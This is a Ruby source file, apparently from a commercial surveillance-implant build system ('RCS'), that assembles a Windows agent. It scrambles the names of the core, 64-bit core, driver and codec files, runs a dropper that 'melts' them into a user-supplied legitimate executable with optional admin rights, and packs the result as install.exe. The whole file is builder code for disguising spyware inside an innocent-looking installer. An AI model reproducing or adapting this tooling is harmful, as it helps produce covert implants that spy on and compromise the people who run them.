#
#  Agent creation for windows
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildWindows < Build

  def initialize
    super
    @platform = 'windows'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # invoke the generic patch method with the new params
    super

  end

  def scramble
    trace :debug, "Build: scrambling"

    core = scramble_name(@factory.seed, 3)
    core_backup = scramble_name(core, 32)
    dir = scramble_name(core[0..7], 7)
    config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
    codec = scramble_name(config, 2)
    driver = scramble_name(config, 4)
    driver64 = scramble_name(config, 16)
    core64 = scramble_name(config, 15)

    @scrambled = {core: core, core64: core64, driver: driver, driver64: driver64,
                  dir: dir, config: config, codec: codec }

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super
    
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    manifest = (params['admin'] == true) ? '1' : '0'

    executable = path('default')

    # use the user-provided file to melt with
    if params['input']
      FileUtils.mv File.join(Dir.tmpdir, params['input']), path('input')
      executable = path('input')
    end

    CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                        path(@scrambled[:core64])+' '+
                                        path(@scrambled[:config])+' '+
                                        path(@scrambled[:driver])+' '+
                                        path(@scrambled[:driver64])+' '+
                                        path(@scrambled[:codec])+' '+
                                        @scrambled[:dir]+' '+
                                        manifest +' '+
                                        executable + ' ' +
                                        path('output')


    File.exist? path('output') || raise("output file not created by dropper")

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    @outputs << 'output'
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open('install.exe', "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

end

end #DB::
end #RCS::
